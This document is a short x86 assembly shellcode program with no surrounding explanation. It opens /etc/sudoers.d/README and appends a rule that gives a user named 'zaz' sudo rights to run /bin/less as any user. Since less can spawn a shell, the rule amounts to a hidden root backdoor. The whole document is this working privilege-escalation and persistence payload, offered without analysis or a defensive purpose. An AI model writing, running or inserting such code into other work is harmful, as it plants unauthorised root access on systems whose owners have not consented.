section .text
    global _start

_start:
    xor eax, eax         ; Clear eax
    xor ecx, ecx         ; Clear ecx
    xor edx, edx         ; Clear edx
    push eax             ; Push null byte onto stack
    push 0x454d4441      ; ADME
    push 0x45522f64      ; d/RE
    push 0x2e737265      ; ers.
    push 0x6f647573      ; sudo
    push 0x2f637465      ; etc/          
    push 0x2f2f2f2f      ; ////

    mov ebx, esp         ; Move pointer to file name into ebx
    mov al, 5            ; sys_open
    mov cx, 1089         ; O_WRONLY | O_APPEND | O_CREAT
    mov dx, 440          ; permissions
    int 0x80

    mov ebx, eax         ; file descriptor

    xor eax, eax         ; Clear eax
    push eax             ; Push null byte onto stack
    push 0x0a737365      ; ess\n
    push 0x6c2f6e69      ; in/l
    push 0x622f2029      ; ) /b
    push 0x4c4c413a      ; :ALL
    push 0x4c4c4128      ; (ALL
    push 0x3d4c4c41      ; ALL=
    push 0x207a617a      ; zaz 
    ; Write to file
    mov al, 4            ; sys_write
    xor edx, edx         ; Clear edx
    mov ecx, esp
    mov dl, 28           ; length of string
    int 0x80

    ; Close file
    mov al, 6            ; sys_close
    int 0x80

    ; Exit
    mov al, 1            ; sys_exit
    xor ebx, ebx
    int 0x80